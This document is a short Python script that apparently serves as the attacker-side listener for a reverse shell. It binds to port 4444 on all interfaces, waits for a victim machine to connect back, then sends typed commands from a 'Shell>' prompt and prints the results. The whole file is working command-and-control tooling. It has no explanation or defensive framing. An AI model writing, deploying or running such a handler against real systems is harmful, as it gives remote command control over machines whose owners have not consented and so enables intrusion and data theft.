import socket

def main():
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Listening on {PORT}")

    client_socket, client_addr = server.accept()
    print(f"[+] Connection from {client_addr}")

    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            client_socket.send(b"exit")
            break
        if command.strip() == "":
            continue
        client_socket.send(command.encode())
        output = client_socket.recv(4096).decode()
        print(output)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()
